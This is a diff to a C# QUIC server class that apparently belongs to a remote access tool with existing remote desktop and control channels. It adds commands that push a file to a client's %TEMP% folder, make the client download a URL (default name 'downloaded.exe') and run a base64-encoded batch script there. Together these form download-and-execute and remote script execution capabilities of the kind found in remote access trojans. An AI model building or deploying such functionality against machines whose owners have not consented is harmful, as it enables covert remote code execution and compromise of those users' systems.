@@ -137,6 +137,181 @@ public sealed class Server
         }
     }
 
+    public async Task<string?> SendRunFileAsync(UserData user, string filePath, string fileName, string remotePath, CancellationToken token = default)
+    {
+        if (user.Client is null || string.IsNullOrWhiteSpace(filePath))
+        {
+            return "Invalid client or file path";
+        }
+
+        try
+        {
+            FileInfo fi = new(filePath);
+            const long maxFileSize = 150L * 1024 * 1024;
+
+            if (fi.Length > maxFileSize)
+            {
+                return $"File too large ({fi.Length / 1024 / 1024} MB). Max: 150 MB";
+            }
+
+            if (string.IsNullOrWhiteSpace(fileName))
+            {
+                fileName = Path.GetFileName(filePath);
+            }
+
+            if (string.IsNullOrWhiteSpace(remotePath))
+            {
+                remotePath = "%TEMP%";
+            }
+
+            QuicStream outbound = await user.Client.OpenOutboundStreamAsync(QuicStreamType.Unidirectional, token);
+            await using (outbound)
+            {
+                ClientMessage startMsg = new()
+                {
+                    Channel = ChannelNames.File,
+                    Type = MessageTypes.FileStart,
+                    FileName = fileName,
+                    FileSize = fi.Length,
+                    RemotePath = remotePath
+                };
+                await WriteFrameAsync(outbound, startMsg, token);
+
+                byte[] buffer = new byte[3 * 1024 * 1024];
+                long remaining = fi.Length;
+
+                using FileStream fs = new(filePath, FileMode.Open, FileAccess.Read, FileShare.Read, buffer.Length);
+
+                while (remaining > 0)
+                {
+                    int read = await fs.ReadAsync(buffer.AsMemory(0, (int)Math.Min(buffer.Length, remaining)), token);
+                    if (read <= 0) break;
+
+                    string chunkBase64 = Convert.ToBase64String(buffer, 0, read);
+
+                    ClientMessage chunkMsg = new()
+                    {
+                        Channel = ChannelNames.File,
+                        Type = MessageTypes.FileChunk,
+                        FileData = chunkBase64
+                    };
+                    await WriteFrameAsync(outbound, chunkMsg, token);
+
+                    remaining -= read;
+                }
+
+                ClientMessage endMsg = new()
+                {
+                    Channel = ChannelNames.File,
+                    Type = MessageTypes.FileEnd,
+                    FileName = fileName
+                };
+                await WriteFrameAsync(outbound, endMsg, token);
+            }
+
+            return null;
+        }
+        catch (Exception ex)
+        {
+            return ex.Message;
+        }
+    }
+
+    public async Task<string?> SendFileDownloadAsync(UserData user, string url, string fileName, string remotePath, CancellationToken token = default)
+    {
+        if (user.Client is null || string.IsNullOrWhiteSpace(url))
+        {
+            return "Invalid client or URL";
+        }
+
+        if (string.IsNullOrWhiteSpace(fileName))
+        {
+            fileName = Path.GetFileName(new Uri(url).LocalPath);
+            if (string.IsNullOrWhiteSpace(fileName))
+            {
+                fileName = "downloaded.exe";
+            }
+        }
+
+        if (string.IsNullOrWhiteSpace(remotePath))
+        {
+            remotePath = "%TEMP%";
+        }
+
+        try
+        {
+            ClientMessage msg = new()
+            {
+                Channel = ChannelNames.File,
+                Type = MessageTypes.FileDownload,
+                FileUrl = url,
+                FileName = fileName,
+                RemotePath = remotePath
+            };
+
+            QuicStream outbound = await user.Client.OpenOutboundStreamAsync(QuicStreamType.Unidirectional, token);
+            await using (outbound)
+            {
+                await WriteFrameAsync(outbound, msg, token);
+            }
+
+            return null;
+        }
+        catch (Exception ex)
+        {
+            return ex.Message;
+        }
+    }
+
+    public async Task<string?> SendScriptAsync(UserData user, string scriptContent, string fileName, string remotePath, CancellationToken token = default)
+    {
+        if (user.Client is null)
+        {
+            return "Invalid client";
+        }
+
+        if (string.IsNullOrWhiteSpace(scriptContent))
+        {
+            return "Script content is empty";
+        }
+
+        if (string.IsNullOrWhiteSpace(fileName))
+        {
+            fileName = "script.bat";
+        }
+
+        if (string.IsNullOrWhiteSpace(remotePath))
+        {
+            remotePath = "%TEMP%";
+        }
+
+        try
+        {
+            string base64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(scriptContent));
+
+            ClientMessage msg = new()
+            {
+                Channel = ChannelNames.File,
+                Type = MessageTypes.RunScript,
+                FileName = fileName,
+                FileData = base64,
+                RemotePath = remotePath
+            };
+
+            QuicStream outbound = await user.Client.OpenOutboundStreamAsync(QuicStreamType.Unidirectional, token);
+            await using (outbound)
+            {
+                await WriteFrameAsync(outbound, msg, token);
+            }
+
+            return null;
+        }
+        catch (Exception ex)
+        {
+            return ex.Message;
+        }
+    }
+
     public async Task StartServer(int port, string certificatePath, string certificatePassword)
     {
         if (IsRunning)
@@ -470,6 +645,7 @@ public sealed class Server
         public const string Ping = "ping";
         public const string Control = "control";
         public const string Desktop = "desktop";
+        public const string File = "file";
     }
 
     private static class MessageTypes
@@ -482,6 +658,11 @@ public sealed class Server
         public const string DesktopFrame = "frame";
         public const string DesktopStart = "desktop_start";
         public const string DesktopStop = "desktop_stop";
+        public const string FileStart = "file_start";
+        public const string FileChunk = "file_chunk";
+        public const string FileEnd = "file_end";
+        public const string FileDownload = "file_download";
+        public const string RunScript = "run_script";
     }
 
     private sealed class ClientMessage
@@ -496,6 +677,11 @@ public sealed class Server
         public string? DesktopFrame { get; set; }
         public int DesktopMonitor { get; set; }
         public int DesktopQuality { get; set; }
+        public string? FileData { get; set; }
+        public string? FileName { get; set; }
+        public long FileSize { get; set; }
+        public string? FileUrl { get; set; }
+        public string? RemotePath { get; set; }
     }
 
     private sealed class ClientSession
